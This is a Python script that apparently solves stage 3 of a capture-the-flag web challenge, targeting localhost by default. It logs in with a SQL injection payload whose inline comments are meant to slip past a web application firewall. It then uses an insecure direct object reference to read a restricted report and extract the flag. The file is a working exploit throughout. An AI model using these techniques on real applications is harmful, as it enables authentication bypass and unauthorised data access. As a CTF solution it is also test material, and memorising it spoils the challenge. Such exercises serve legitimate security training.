import requests
import sys

def solve_stage3(base_url):
    print(f"[*] Target URL: {base_url}")
    session = requests.Session()

    # 1. WAF Bypass Payload using inline comments to avoid spaces
    login_url = f"{base_url.rstrip('/')}/login"
    payload_username = "admin'/**/OR/**/1=1/**/--"
    payload_password = "anything"

    data = {
        "username": payload_username,
        "password": payload_password
    }

    print("[*] Attempting WAF bypass authentication...")
    response = session.post(login_url, data=data, allow_redirects=True)

    if response.status_code == 200 and ("Dashboard" in response.text or "System Reports" in response.text):
        print("[+] Authentication bypass successful!")
    else:
        print("[-] Login failed. Check if the container is running and URL is correct.")
        sys.exit(1)

    # 2. IDOR Exploitation to retrieve the flag from the reports page
    report_url = f"{base_url.rstrip('/')}/reports/view?id=99"
    print(f"[*] Accessing restricted report via IDOR: {report_url}")
    
    report_response = session.get(report_url)

    if "Eclipse{" in report_response.text:
        # Extract the flag substring
        start_idx = report_response.text.find("Eclipse{")
        end_idx = report_response.text.find("}", start_idx) + 1
        flag = report_response.text[start_idx:end_idx]
        print(f"[+] SUCCESS! Flag captured: {flag}")
    else:
        print("[-] Logged in, but could not locate the flag in the report response.")
        sys.exit(1)

if __name__ == "__main__":
    # You can pass your active Cloudflare tunnel URL or http://localhost:8080 as an argument
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    solve_stage3(target)